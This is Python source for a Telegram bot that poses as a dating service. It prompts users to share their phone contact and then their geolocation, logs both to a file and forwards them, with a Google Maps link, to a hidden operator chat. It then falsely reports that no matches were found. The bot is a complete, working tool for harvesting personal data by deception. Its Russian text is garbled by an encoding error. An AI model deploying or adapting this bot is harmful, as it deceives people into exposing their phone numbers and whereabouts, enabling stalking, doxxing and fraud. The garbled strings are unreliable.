import telebot
from telebot import types
import time
import random

ID = ''
bot = telebot.TeleBot("")
bot.send_message(ID, '!BOT STARTED!') 
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''üëã –ü—Ä–∏–≤–µ—Ç! {message.from_user.first_name}üëã
		–≠—Ç–æ –±–æ—Ç –¥–ª—è –∑–Ω–∞–∫–æ–º—Å—Ç–≤–∞!
	–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –≤–≤–µ–¥–∏—Ç–µ /znak''') 

@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, '–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–µ–º–Ω–æ–≥–æ –æ —Å–µ–±–µ(–æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'–ü–æ–ª—É—á–µ–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: {num}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞, –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –ø–æ–∂–∞–ª—É–π—Å—Ç–∞!''', reply_markup=keyboard)
# –û—Ç–ª–æ–≤–∫–∞ –æ—à–∏–±–æ–∫
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!")
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {first} {last}
			‚îúID: {userid}
			‚îú–ù–∏–∫: @{nick}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="–û—Ç–ø—Ä–∞–≤–∏—Ç—å", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ—é –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é, –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –±–æ—Ç –Ω–∞—à–µ–ª –±–ª–∏–∂–∞–π—à–∏—Ö –æ—Ç –≤–∞—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
		‚îúID: {message.chat.id}
		‚îúLongitude: {lon}
		‚îúLatitude: {lat} 
		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, '–ü–æ–∏—Å–∫...')
		time.sleep(2)
		bot.send_message(message.chat.id, '–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –≤ –±–∞–∑–µ –Ω–µ –Ω–∞—à–ª–æ—Å—å –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!')
bot.polling()